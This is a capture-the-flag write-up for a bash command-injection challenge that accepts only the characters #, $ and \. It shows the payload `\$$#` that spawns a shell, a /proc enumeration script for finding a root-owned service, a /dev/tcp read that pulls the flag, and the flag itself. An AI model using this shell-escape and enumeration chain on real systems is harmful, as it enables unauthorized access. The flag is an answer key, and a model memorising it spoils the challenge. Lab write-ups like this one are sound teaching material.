sending nonsense like `$#\` will get the terminal to output "eval failed", so our payload is being run with bash

`\$$#` gets a shell for some reason

## HashCashSlash  

<img src="images/chall.png" width=600>

We are given a service that allows us to enter a one-line payload, which it will then execute using `bash`. The main limitation is that we are restricted to only `3` characters: `#`, `$` and `\`.  

To get a shell we can send `\$$#`. `\$` evaluates to the literal `$` and `$#` evaluates to the number of positional arguments for the current bash command. We can logically assume the program is running our payload with `bash -c "<cmd>"`, so there are `0` arguments.  

This causes our payload to expand to `$0`, which will evaluate to the current program being run, in this case, `bash`.  

```bash
\$$#
```

After popping a shell with our payload, we can find `/flag` in root, but we don't have permission to read it.  

<img src="images/perms.png" width=600>

We can enumerate all running processes in the current shell with this script.  

```bash
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
  status=$(cat /proc/$pid/status 2>/dev/null | grep "^Uid:" | awk '{print $2}')
  if [ ! -z "$cmdline" ]; then
    echo "PID $pid (UID $status): $cmdline"
  fi
done
```

This will reveal process `9` running a small TCP server as root, which will print the contents of `/flag` when connected!  

<img src="images/proc.png" width=600>

We can then connect to localhost port `41026` and get our flag.  

```bash
cat < /dev/tcp/127.0.0.1/41026
```

Flag: `0xL4ugh{m1n1m4l_1nput_m4x1mum_d4m4g3_1ef71656d64bc5a3}`